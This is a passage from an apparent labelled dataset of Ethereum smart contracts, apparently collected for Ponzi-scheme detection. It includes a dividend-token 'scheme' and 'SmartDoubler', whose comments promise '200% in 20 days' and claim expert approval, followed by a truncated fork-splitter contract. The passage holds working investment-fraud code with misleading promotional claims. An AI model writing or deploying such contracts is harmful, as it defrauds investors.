rewardPerShare;\r\r\n\t\t}\r\r\n\t\t\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We're a crypto central bank!\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\t\t\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\t\tvar payoutDiff  = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\t\t\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Sells your tokens for Ether. This Ether is assigned to the callers entry\r\r\n\t\/\/ in the tokenBalance array, and therefore is shown as a dividend. A second\r\r\n\t\/\/ call to withdraw() must be made to invoke the transfer of Ether back to your address.\r\r\n\tfunction sellMyTokens() public {\r\r\n\t\tvar balance = balanceOf(msg.sender);\r\r\n\t\tsell(balance);\r\r\n\t}\r\r\n\r\r\n\t\/\/ The slam-the-button escape hatch. Sells the callers tokens for Ether, then immediately\r\r\n\t\/\/ invokes the withdraw() function, sending the resulting Ether to the callers address.\r\r\n    function getMeOutOfHere() public {\r\r\n\t\tsellMyTokens();\r\r\n        withdraw();\r\r\n\t}\r\r\n\r\r\n\t\/\/ Gatekeeper function to check if the amount of Ether being sent isn't either\r\r\n\t\/\/ too small or too large. If it passes, goes direct to buy().\r\r\n\tfunction fund() payable public {\r\r\n\t\t\/\/ Don't allow for funding if the amount of Ether sent is less than 1 szabo.\r\r\n\t\tif (msg.value > 0.000001 ether) {\r\r\n\t\t    contractBalance = add(contractBalance, msg.value);\r\r\n\t\t\tbuy();\r\r\n\t\t} else {\r\r\n\t\t\trevert();\r\r\n\t\t}\r\r\n    }\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of buying a finney worth of tokens.\r\r\n\tfunction buyPrice() public constant returns (uint) {\r\r\n\t\treturn getTokensForEther(1 finney);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Function that returns the (dynamic) price of selling a single token.\r\r\n\tfunction sellPrice() public constant returns (uint) {\r\r\n        var eth = getEtherForTokens(1 finney);\r\r\n        var fee = div(eth, 10);\r\r\n        return eth - fee;\r\r\n    }\r\r\n\r\r\n\t\/\/ Calculate the current dividends associated with the caller address. This is the net result\r\r\n\t\/\/ of multiplying the number of tokens held by their current value in Ether and subtracting the\r\r\n\t\/\/ Ether that has already been paid out.\r\r\n\tfunction dividends(address _owner) public constant returns (uint256 amount) {\r\r\n\t\treturn (uint256) ((int256)(earningsPerToken * tokenBalance[_owner]) - payouts[_owner]) \/ scaleFactor;\r\r\n\t}\r\r\n\r\r\n\t\/\/ Version of withdraw that extracts the dividends and sends the Ether to the caller.\r\r\n\t\/\/ This is only used in the case when there is no transaction data, and that should be\r\r\n\t\/\/ quite rare unless interacting directly with the smart contract.\r\r\n\tfunction withdrawOld(address to) public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\t\tto.transfer(balance);\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Internal balance function, used to calculate the dynamic reserve value.\r\r\n\tfunction balance() internal constant returns (uint256 amount) {\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\t\treturn contractBalance - msg.value;\r\r\n\t}\r\r\n\r\r\n\tfunction buy() internal {\r\r\n\t\t\/\/ Any transaction of less than 1 szabo is likely to be worth less than the gas used to send it.\r\r\n\t\tif (msg.value < 0.000001 ether || msg.value > 1000000 ether)\r\r\n\t\t\trevert();\r\r\n\t\t\t\t\t\t\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\t\tvar sender = msg.sender;\r\r\n\t\t\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\t\tvar fee = div(msg.value, 10);\r\r\n\t\t\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\t\tvar numEther = msg.value - fee;\r\r\n\t\t\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\t\tvar numTokens = getTokensForEther(numEther);\r\r\n\t\t\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\t\t\/\/ else you're gonna have a bad time.\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\t\t\tvar bonusCoEff =\r\r\n\t\t\t    (scaleFactor - (reserve() + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\t\t\t\t\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\t\t\t\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken += rewardPerShare;\r\r\n\t\t\t\r\r\n\t\t}\r\r\n\r\r\n\t\t\/\/ Add the numTokens which were just created to the total supply. We're a crypto central bank!\r\r\n\t\ttotalSupply = add(totalSupply, numTokens);\r\r\n\r\r\n\t\t\/\/ Assign the tokens to the balance of the buyer.\r\r\n\t\ttokenBalance[sender] = add(tokenBalance[sender], numTokens);\r\r\n\r\r\n\t\t\/\/ Update the payout array so that the buyer cannot claim dividends on previous purchases.\r\r\n\t\t\/\/ Also include the fee paid for entering the scheme.\r\r\n\t\t\/\/ First we compute how much was just paid out to the buyer...\r\r\n\t\tvar payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\t\t\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\t\t\r\r\n\t}\r\r\n\r\r\n\t\/\/ Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee\r\r\n\t\/\/ to discouraging dumping, and means that if someone near the top sells, the fee distributed\r\r\n\t\/\/ will be *significant*.\r\r\n\tfunction sell(uint256 amount) internal {\r\r\n\t    \/\/ Calculate the amount of Ether that the holders tokens sell for at the current sell price.\r\r\n\t\tvar numEthersBeforeFee = getEtherForTokens(amount);\r\r\n\t\t\r\r\n\t\t\/\/ 10% of the resulting Ether is used to pay remaining holders.\r\r\n        var fee = div(numEthersBeforeFee, 10);\r\r\n\t\t\r\r\n\t\t\/\/ Net Ether for the seller after the fee has been subtracted.\r\r\n        var numEthers = numEthersBeforeFee - fee;\r\r\n\t\t\r\r\n\t\t\/\/ *Remove* the numTokens which were just sold from the total supply. We're \/definitely\/ a crypto central bank.\r\r\n\t\ttotalSupply = sub(totalSupply, amount);\r\r\n\t\t\r\r\n        \/\/ Remove the tokens from the balance of the buyer.\r\r\n\t\ttokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);\r\r\n\r\r\n        \/\/ Update the payout array so that the seller cannot claim future dividends unless they buy back in.\r\r\n\t\t\/\/ First we compute how much was just paid out to the seller...\r\r\n\t\tvar payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));\r\r\n\t\t\r\r\n        \/\/ We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,\r\r\n\t\t\/\/ since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if\r\r\n\t\t\/\/ they decide to buy back in.\r\r\n\t\tpayouts[msg.sender] -= payoutDiff;\t\t\r\r\n\t\t\r\r\n\t\t\/\/ Decrease the total amount that's been paid out to maintain invariance.\r\r\n        totalPayouts -= payoutDiff;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this is a bit of an irrelevant check since we're\r\r\n\t\t\/\/ selling tokens, but it guards against division by zero).\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Scale the Ether taken as the selling fee by the scaleFactor variable.\r\r\n\t\t\tvar etherFee = fee * scaleFactor;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ Fee is distributed to all remaining token holders.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this sell.\r\r\n\t\t\tvar rewardPerShare = etherFee \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken = add(earningsPerToken, rewardPerShare);\r\r\n\t\t}\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ Dynamic value of Ether in reserve, according to the CRR requirement.\r\r\n\tfunction reserve() internal constant returns (uint256 amount) {\r\r\n\t\treturn sub(balance(),\r\r\n\t\t\t ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) \/ scaleFactor));\r\r\n\t}\r\r\n\r\r\n\t\/\/ Calculates the number of tokens that can be bought for a given amount of Ether, according to the\r\r\n\t\/\/ dynamic reserve and totalSupply values (derived from the buy and sell prices).\r\r\n\tfunction getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.\r\r\n\tfunction calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Converts a number tokens into an Ether value.\r\r\n\tfunction getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {\r\r\n\t\t\/\/ How much reserve Ether do we have left in the contract?\r\r\n\t\tvar reserveAmount = reserve();\r\r\n\r\r\n\t\t\/\/ If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.\r\r\n\t\tif (tokens == totalSupply)\r\r\n\t\t\treturn reserveAmount;\r\r\n\r\r\n\t\t\/\/ If there would be excess Ether left after the transaction this is called within, return the Ether\r\r\n\t\t\/\/ corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found\r\r\n\t\t\/\/ at https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/ in the third equation, with the CRR numerator \r\r\n\t\t\/\/ and denominator altered to 1 and 2 respectively.\r\r\n\t\treturn sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d\/crr_n));\r\r\n\t}\r\r\n\r\r\n\t\/\/ You don't care about these, but if you really do they're hex values for \r\r\n\t\/\/ co-efficients used to simulate approximations of the log and exp functions.\r\r\n\tint256  constant one        = 0x10000000000000000;\r\r\n\tuint256 constant sqrt2      = 0x16a09e667f3bcc908;\r\r\n\tuint256 constant sqrtdot5   = 0x0b504f333f9de6484;\r\r\n\tint256  constant ln2        = 0x0b17217f7d1cf79ac;\r\r\n\tint256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;\r\r\n\tint256  constant c1         = 0x1ffffffffff9dac9b;\r\r\n\tint256  constant c3         = 0x0aaaaaaac16877908;\r\r\n\tint256  constant c5         = 0x0666664e5e9fa0c99;\r\r\n\tint256  constant c7         = 0x049254026a7630acf;\r\r\n\tint256  constant c9         = 0x038bd75ed37753d68;\r\r\n\tint256  constant c11        = 0x03284a0c14610924f;\r\r\n\r\r\n\t\/\/ The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11\r\r\n\t\/\/ approximates the function log(1+x)-log(1-x)\r\r\n\t\/\/ Hence R(s) = log((1+s)\/(1-s)) = log(a)\r\r\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\r\r\n\t\tint32 scale = 0;\r\r\n\t\twhile (a > sqrt2) {\r\r\n\t\t\ta \/= 2;\r\r\n\t\t\tscale++;\r\r\n\t\t}\r\r\n\t\twhile (a <= sqrtdot5) {\r\r\n\t\t\ta *= 2;\r\r\n\t\t\tscale--;\r\r\n\t\t}\r\r\n\t\tint256 s = (((int256)(a) - one) * one) \/ ((int256)(a) + one);\r\r\n\t\tvar z = (s*s) \/ one;\r\r\n\t\treturn scale * ln2 +\r\r\n\t\t\t(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11\/one))\r\r\n\t\t\t\t\/one))\/one))\/one))\/one))\/one);\r\r\n\t}\r\r\n\r\r\n\tint256 constant c2 =  0x02aaaaaaaaa015db0;\r\r\n\tint256 constant c4 = -0x000b60b60808399d1;\r\r\n\tint256 constant c6 =  0x0000455956bccdd06;\r\r\n\tint256 constant c8 = -0x000001b893ad04b3a;\r\r\n\t\r\r\n\t\/\/ The polynomial R = 2 + c2*x^2 + c4*x^4 + ...\r\r\n\t\/\/ approximates the function x*(exp(x)+1)\/(exp(x)-1)\r\r\n\t\/\/ Hence exp(x) = (R(x)+x)\/(R(x)-x)\r\r\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\r\r\n\t\tint256 scale = (a + (ln2_64dot5)) \/ ln2 - 64;\r\r\n\t\ta -= scale*ln2;\r\r\n\t\tint256 z = (a*a) \/ one;\r\r\n\t\tint256 R = ((int256)(2) * one) +\r\r\n\t\t\t(z*(c2 + (z*(c4 + (z*(c6 + (z*c8\/one))\/one))\/one))\/one);\r\r\n\t\texp = (uint256) (((R + a) * one) \/ (R - a));\r\r\n\t\tif (scale >= 0)\r\r\n\t\t\texp <<= scale;\r\r\n\t\telse\r\r\n\t\t\texp >>= -scale;\r\r\n\t\treturn exp;\r\r\n\t}\r\r\n\t\r\r\n\t\/\/ The below are safemath implementations of the four arithmetic operators\r\r\n\t\/\/ designed to explicitly prevent over- and under-flows of integer values.\r\r\n\r\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tif (a == 0) {\r\r\n\t\t\treturn 0;\r\r\n\t\t}\r\r\n\t\tuint256 c = a * b;\r\r\n\t\tassert(c \/ a == b);\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\t\/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n\t\tuint256 c = a \/ b;\r\r\n\t\t\/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn't hold\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tassert(b <= a);\r\r\n\t\treturn a - b;\r\r\n\t}\r\r\n\r\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\t\tuint256 c = a + b;\r\r\n\t\tassert(c >= a);\r\r\n\t\treturn c;\r\r\n\t}\r\r\n\r\r\n\t\/\/ This allows you to buy tokens by sending Ether directly to the smart contract\r\r\n\t\/\/ without including any transaction data (useful for, say, mobile wallet apps).\r\r\n\tfunction () payable public {\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\t\tif (msg.value > 0) {\r\r\n\t\t\tfund();\r\r\n\t\t} else {\r\r\n\t\t\twithdrawOld(msg.sender);\r\r\n\t\t}\r\r\n\t}\r\r\n}","label":1}
{"code":"\/**\r\r\n\r\r\n *Submitted for verification at Etherscan.io on 2018-10-19\r\r\n\r\r\n*\/\r\r\n\r\r\n\r\r\n\r\r\npragma solidity 0.4.25;\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n\r\r\n *  - GAIN UP TO 200% IN 20 DAYS\r\r\n\r\r\n *\r\r\n\r\r\n *  - Minimal contribution 0.05 eth\r\r\n\r\r\n *  - Currency and payment - ETH\r\r\n\r\r\n *  - Contribution allocation schemes:\r\r\n\r\r\n *    -- 91 % payments (3 % for Referral Program)\r\r\n\r\r\n *    -- 6 % marketing\r\r\n\r\r\n *    -- 3 % administration fee\r\r\n\r\r\n *\r\r\n\r\r\n *\r\r\n\r\r\n *  Percentage of your profit depends on balance of the contract:\r\r\n\r\r\n *\r\r\n\r\r\n *              balance     |   %   |  profit\r\r\n\r\r\n *            -------------------------------\r\r\n\r\r\n *            <  500 ETH    |  6 %  |   120 %\r\r\n\r\r\n *            >  500 ETH    |  7 %  |   140 %\r\r\n\r\r\n *            > 1500 ETH    |  8 %  |   160 %\r\r\n\r\r\n *            > 2500 ETH    |  9 %  |   180 %\r\r\n\r\r\n *            > 5000 ETH    | 10 %  |   200 %\r\r\n\r\r\n *\r\r\n\r\r\n *\r\r\n\r\r\n *    Referral program:\r\r\n\r\r\n *    Add your referrer address to DATA field when you invest or reinvest ETH:\r\r\n\r\r\n *     - You will get instant cashback 1 % of your Deposit\r\r\n\r\r\n *     - Your referrer will get bonus 2 % while withdrawing Dividends\r\r\n\r\r\n *\r\r\n\r\r\n *     -- You can add new referrer every time you invest money\r\r\n\r\r\n *     -- Referrer MUST be a participant of the project\r\r\n\r\r\n *     -- You can't be referrer for yourself\r\r\n\r\r\n *     -- If you have no referrer 3 % goes to marketing expenses\r\r\n\r\r\n *\r\r\n\r\r\n *\r\r\n\r\r\n *  How to use:\r\r\n\r\r\n *  1. Send ETH (more than 0.05) to make an investment\r\r\n\r\r\n *  2a. Claim your profit at any time by sending 0 ether transaction\r\r\n\r\r\n *  Also you can send less than 0.05 ETH and you will get back your sended amount and dividends.\r\r\n\r\r\n *  OR\r\r\n\r\r\n *  2b. Send more ETH to reinvest AND get your profit at the same time\r\r\n\r\r\n *\r\r\n\r\r\n *  Any deposit brings money only 20 days from the time of investment.\r\r\n\r\r\n *\r\r\n\r\r\n *  RECOMMENDED GAS LIMIT: 250000\r\r\n\r\r\n *  RECOMMENDED GAS PRICE: https:\/\/ethgasstation.info\/\r\r\n\r\r\n *\r\r\n\r\r\n *\r\r\n\r\r\n *  Contract reviewed and approved by experts!\r\r\n\r\r\n *\r\r\n\r\r\n *\/\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\nlibrary SafeMath {\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n    function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\r\n\r\r\n\r\r\n\r\r\n        if (_a == 0) {\r\r\n\r\r\n            return 0;\r\r\n\r\r\n        }\r\r\n\r\r\n\r\r\n\r\r\n        uint256 c = _a * _b;\r\r\n\r\r\n        require(c \/ _a == _b);\r\r\n\r\r\n\r\r\n\r\r\n        return c;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\r\n\r\r\n        require(_b > 0);\r\r\n\r\r\n        uint256 c = _a \/ _b;\r\r\n\r\r\n\r\r\n\r\r\n        return c;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\r\n\r\r\n        require(_b <= _a);\r\r\n\r\r\n        uint256 c = _a - _b;\r\r\n\r\r\n\r\r\n\r\r\n        return c;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\r\n\r\r\n        uint256 c = _a + _b;\r\r\n\r\r\n        require(c >= _a);\r\r\n\r\r\n\r\r\n\r\r\n        return c;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n        require(b != 0);\r\r\n\r\r\n        return a % b;\r\r\n\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\ncontract SmartDoubler {\r\r\n\r\r\n    using SafeMath for uint;\r\r\n\r\r\n\r\r\n\r\r\n    address public owner;\r\r\n\r\r\n    address marketing;\r\r\n\r\r\n    address admin;\r\r\n\r\r\n\r\r\n\r\r\n    mapping (address => uint) index;\r\r\n\r\r\n    mapping (address => mapping (uint => uint)) deposit;\r\r\n\r\r\n    mapping (address => mapping (uint => uint)) finish;\r\r\n\r\r\n    mapping (address => uint) checkpoint;\r\r\n\r\r\n\r\r\n\r\r\n    mapping (address => uint) refBonus;\r\r\n\r\r\n\r\r\n\r\r\n    event LogInvestment(address indexed _addr, uint _value);\r\r\n\r\r\n    event LogPayment(address indexed _addr, uint _value);\r\r\n\r\r\n    event LogReferralInvestment(address indexed _referrer, address indexed _referral, uint _value);\r\r\n\r\r\n\r\r\n\r\r\n    constructor(address _marketing, address _admin) public {\r\r\n\r\r\n        owner = msg.sender;\r\r\n\r\r\n        marketing = _marketing;\r\r\n\r\r\n        admin = _admin;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function renounceOwnership() external {\r\r\n\r\r\n        require(msg.sender == owner);\r\r\n\r\r\n        owner = 0x0;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function bytesToAddress(bytes _source) internal pure returns(address parsedreferrer) {\r\r\n\r\r\n        assembly {\r\r\n\r\r\n            parsedreferrer := mload(add(_source,0x14))\r\r\n\r\r\n        }\r\r\n\r\r\n        return parsedreferrer;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function refSystem() internal {\r\r\n\r\r\n        address _referrer = bytesToAddress(bytes(msg.data));\r\r\n\r\r\n        if (_referrer != msg.sender && getInfo3(_referrer) > 0) {\r\r\n\r\r\n            marketing.transfer(msg.value * 6 \/ 100);\r\r\n\r\r\n            msg.sender.transfer(msg.value * 1 \/ 100);\r\r\n\r\r\n            refBonus[_referrer] += msg.value * 2 \/ 100;\r\r\n\r\r\n\r\r\n\r\r\n            emit LogReferralInvestment(_referrer, msg.sender, msg.value);\r\r\n\r\r\n        } else {\r\r\n\r\r\n            marketing.transfer(msg.value * 9 \/ 100);\r\r\n\r\r\n        }\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function getInterest() public view returns (uint) {\r\r\n\r\r\n\r\r\n\r\r\n        if (address(this).balance >= 5000e18) {\r\r\n\r\r\n            return 10;\r\r\n\r\r\n        }\r\r\n\r\r\n        if (address(this).balance >= 2500e18) {\r\r\n\r\r\n            return 9;\r\r\n\r\r\n        }\r\r\n\r\r\n        if (address(this).balance >= 1500e18) {\r\r\n\r\r\n            return 8;\r\r\n\r\r\n        }\r\r\n\r\r\n        if (address(this).balance >= 500e18) {\r\r\n\r\r\n            return 7;\r\r\n\r\r\n        } else {\r\r\n\r\r\n            return 6;\r\r\n\r\r\n        }\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function() external payable {\r\r\n\r\r\n        if (msg.value < 50000000000000000) {\r\r\n\r\r\n            msg.sender.transfer(msg.value);\r\r\n\r\r\n            withdraw();\r\r\n\r\r\n        } else {\r\r\n\r\r\n            invest();\r\r\n\r\r\n        }\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function invest() public payable {\r\r\n\r\r\n\r\r\n\r\r\n        require(msg.value >= 50000000000000000);\r\r\n\r\r\n        admin.transfer(msg.value * 3 \/ 100);\r\r\n\r\r\n\r\r\n\r\r\n        if (getInfo3(msg.sender) + getInfo4(msg.sender) > 0) {\r\r\n\r\r\n            withdraw();\r\r\n\r\r\n            if (deposit[msg.sender][0] > 0) {\r\r\n\r\r\n                index[msg.sender] += 1;\r\r\n\r\r\n            }\r\r\n\r\r\n        }\r\r\n\r\r\n\r\r\n\r\r\n        checkpoint[msg.sender] = block.timestamp;\r\r\n\r\r\n        finish[msg.sender][index[msg.sender]] = block.timestamp + (20 * 1 days);\r\r\n\r\r\n        deposit[msg.sender][index[msg.sender]] = msg.value;\r\r\n\r\r\n\r\r\n\r\r\n        if (msg.data.length != 0) {\r\r\n\r\r\n            refSystem();\r\r\n\r\r\n        } else {\r\r\n\r\r\n            marketing.transfer(msg.value * 9 \/ 100);\r\r\n\r\r\n        }\r\r\n\r\r\n\r\r\n\r\r\n        emit LogInvestment(msg.sender, msg.value);\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function withdraw() public {\r\r\n\r\r\n\r\r\n\r\r\n        uint _payout = refBonus[msg.sender];\r\r\n\r\r\n        refBonus[msg.sender] = 0;\r\r\n\r\r\n\r\r\n\r\r\n        for (uint i = 0; i <= index[msg.sender]; i++) {\r\r\n\r\r\n            if (checkpoint[msg.sender] < finish[msg.sender][i]) {\r\r\n\r\r\n                if (block.timestamp > finish[msg.sender][i]) {\r\r\n\r\r\n                    _payout = _payout.add((deposit[msg.sender][i].mul(getInterest()).div(100)).mul(finish[msg.sender][i].sub(checkpoint[msg.sender])).div(1 days));\r\r\n\r\r\n                } else {\r\r\n\r\r\n                    _payout = _payout.add((deposit[msg.sender][i].mul(getInterest()).div(100)).mul(block.timestamp.sub(checkpoint[msg.sender])).div(1 days));\r\r\n\r\r\n                }\r\r\n\r\r\n            }\r\r\n\r\r\n        }\r\r\n\r\r\n\r\r\n\r\r\n        if (_payout > 0) {\r\r\n\r\r\n            checkpoint[msg.sender] = block.timestamp;\r\r\n\r\r\n            msg.sender.transfer(_payout);\r\r\n\r\r\n\r\r\n\r\r\n            emit LogPayment(msg.sender, _payout);\r\r\n\r\r\n        }\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function getInfo1(address _address) public view returns(uint Invested) {\r\r\n\r\r\n        uint _sum;\r\r\n\r\r\n        for (uint i = 0; i <= index[_address]; i++) {\r\r\n\r\r\n            if (block.timestamp < finish[_address][i]) {\r\r\n\r\r\n                _sum += deposit[_address][i];\r\r\n\r\r\n            }\r\r\n\r\r\n        }\r\r\n\r\r\n        Invested = _sum;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function getInfo2(address _address, uint _number) public view returns(uint Deposit_N) {\r\r\n\r\r\n        if (block.timestamp < finish[_address][_number - 1]) {\r\r\n\r\r\n            Deposit_N = deposit[_address][_number - 1];\r\r\n\r\r\n        } else {\r\r\n\r\r\n            Deposit_N = 0;\r\r\n\r\r\n        }\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function getInfo3(address _address) public view returns(uint Dividends) {\r\r\n\r\r\n        uint _payout;\r\r\n\r\r\n        for (uint i = 0; i <= index[_address]; i++) {\r\r\n\r\r\n            if (checkpoint[_address] < finish[_address][i]) {\r\r\n\r\r\n                if (block.timestamp > finish[_address][i]) {\r\r\n\r\r\n                    _payout = _payout.add((deposit[_address][i].mul(getInterest()).div(100)).mul(finish[_address][i].sub(checkpoint[_address])).div(1 days));\r\r\n\r\r\n                } else {\r\r\n\r\r\n                    _payout = _payout.add((deposit[_address][i].mul(getInterest()).div(100)).mul(block.timestamp.sub(checkpoint[_address])).div(1 days));\r\r\n\r\r\n                }\r\r\n\r\r\n            }\r\r\n\r\r\n        }\r\r\n\r\r\n        Dividends = _payout;\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n\r\r\n    function getInfo4(address _address) public view returns(uint Bonuses) {\r\r\n\r\r\n        Bonuses = refBonus[_address];\r\r\n\r\r\n    }\r\r\n\r\r\n}","label":1}
{"code":"contract AmIOnTheFork {\r\r\n    function forked() constant returns(bool);\r\r\n}\r\r\n\r\r\ncontract SplitterEthToEtc {\r\r\n\r\r\n    address intermediate;\r\r\n    address owner;\r\r\n\r\r\n    \/\/ there is a limit accepted by exchange\r\r\n    uint256 public upLimit = 100 ether;\r\r\n    \/\/ and exchange costs, ignore small transactions\r\r\n    uint256 public lowLimit = 0.1 ether;\r\r\n\r\r\n    AmIOnTheFork amIOnTheFork = AmIOnTheFork(0x2bd2326c993dfaef84f696526064ff22eba5b362);\r\r\n\r\r\n    function SplitterEthToEtc() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    function() {\r\r\n        \/\/stop too small transactions\r\r\n        if (msg.value < lowLimit)\r\r\n            throw;\r\r\n\r\r\n        if (amIOnTheFork.forked()) {\r\r\n            \/\/ process with exchange on the FORK chain\r\r\n            if (msg.value <= upLimit) {\r\r\n                \/\/ can exchange, send to intermediate\r\r\n                if (!intermediate.send(msg.value))\r\r\n                    